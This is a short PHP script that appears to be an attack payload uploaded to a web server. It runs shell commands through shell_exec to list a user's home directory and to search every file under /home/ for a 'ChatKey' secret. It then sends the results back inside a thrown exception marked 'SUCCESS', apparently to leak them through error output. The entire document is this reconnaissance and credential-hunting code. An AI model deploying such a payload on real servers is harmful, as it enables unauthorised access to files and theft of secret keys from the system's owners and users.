<?php
$output ='';

$output =$output."\n root ls ".shell_exec ('ls /home/pinhead/  | cat');
$output =$output."\n htpaswd ".shell_exec ("grep -rnw '/home/' -e '*ChatKey*'  | cat");

throw new Exception("\n SUCCESS  ". $output."\n");
?>
